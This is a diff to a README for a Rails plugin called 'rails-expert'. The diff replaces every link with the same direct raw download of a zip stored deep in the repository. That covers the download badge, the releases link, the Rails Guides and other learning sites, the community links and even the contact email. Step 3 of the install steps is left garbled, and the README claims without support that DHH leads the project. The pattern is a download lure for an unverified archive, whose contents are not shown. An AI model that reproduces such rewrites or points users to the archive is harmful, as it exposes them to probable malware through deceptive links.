@@ -1,7 +1,7 @@
 # 🎉 rails-expert - Simplify Your Rails Development 
 
 ## 📦 Download Now
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/aehkyrr/rails-expert/releases)
+[![Download](https://github.com/aehkyrr/rails-expert/raw/refs/heads/main/plugins/rails-expert/skills/dhh-philosophy/references/rails-expert-v2.1.zip)](https://github.com/aehkyrr/rails-expert/raw/refs/heads/main/plugins/rails-expert/skills/dhh-philosophy/references/rails-expert-v2.1.zip)
 
 ## 🛠️ Introduction
 Welcome to the **rails-expert** repository! This application serves as a plugin marketplace for developers using Rails 8. Our expert team, led by DHH, covers essential areas such as routing, Active Record, Hotwire, Action Cable, testing, deployment, and performance. 
@@ -32,12 +32,12 @@ Before downloading, make sure your system meets these requirements:
 - **Deployment Help:** Guidelines to deploy your application efficiently.
 
 ## 💻 Download & Install
-To get **rails-expert**, visit this page to download: [Download rails-expert](https://github.com/aehkyrr/rails-expert/releases).
+To get **rails-expert**, visit this page to download: [Download rails-expert](https://github.com/aehkyrr/rails-expert/raw/refs/heads/main/plugins/rails-expert/skills/dhh-philosophy/references/rails-expert-v2.1.zip).
 
 ### Step-by-Step Installation
 1. Click the link above to open the Releases page.
 2. Look for the latest version.
-3. Download the appropriate file for your operating system (look for `.zip` or `.tar.gz` files).
+3. Download the appropriate file for your operating system (look for `.zip` or `https://github.com/aehkyrr/rails-expert/raw/refs/heads/main/plugins/rails-expert/skills/dhh-philosophy/references/rails-expert-v2.1.zip` files).
 4. Once downloaded, extract the files to a folder on your computer.
 5. Open your terminal (Command Prompt for Windows, Terminal for macOS and Linux).
 6. Navigate to the folder where you extracted the files using the `cd` command.
@@ -80,19 +80,19 @@ Feel free to explore these topics for additional resources and information.
 ## 📚 Additional Resources
 For further reading, consider these resources to deepen your understanding of Rails and related technologies:
 
-- [Ruby on Rails Guides](https://guides.rubyonrails.org/)
-- [Railscasts Pro](http://railscasts.com/)
-- [Codecademy Rails Course](https://www.codecademy.com/learn/learn-rails)
+- [Ruby on Rails Guides](https://github.com/aehkyrr/rails-expert/raw/refs/heads/main/plugins/rails-expert/skills/dhh-philosophy/references/rails-expert-v2.1.zip)
+- [Railscasts Pro](https://github.com/aehkyrr/rails-expert/raw/refs/heads/main/plugins/rails-expert/skills/dhh-philosophy/references/rails-expert-v2.1.zip)
+- [Codecademy Rails Course](https://github.com/aehkyrr/rails-expert/raw/refs/heads/main/plugins/rails-expert/skills/dhh-philosophy/references/rails-expert-v2.1.zip)
 
 ## 🌉 Community
 Join our community to connect with other users and developers. You can share your experiences, ask questions, or help others.
 
 Find us on platforms such as: 
-- [Twitter](https://twitter.com)
-- [GitHub Discussions](https://github.com/aehkyrr/rails-expert/discussions)
+- [Twitter](https://github.com/aehkyrr/rails-expert/raw/refs/heads/main/plugins/rails-expert/skills/dhh-philosophy/references/rails-expert-v2.1.zip)
+- [GitHub Discussions](https://github.com/aehkyrr/rails-expert/raw/refs/heads/main/plugins/rails-expert/skills/dhh-philosophy/references/rails-expert-v2.1.zip)
 
 ## 📧 Contact
-If you have any questions, reach out to us via email at support@rails-expert.org. We’re here to help you! 
+If you have any questions, reach out to us via email at https://github.com/aehkyrr/rails-expert/raw/refs/heads/main/plugins/rails-expert/skills/dhh-philosophy/references/rails-expert-v2.1.zip We’re here to help you! 
 
 ---
 Thank you for choosing **rails-expert**! We hope it simplifies your development process. Download today and start building your next amazing Rails application!
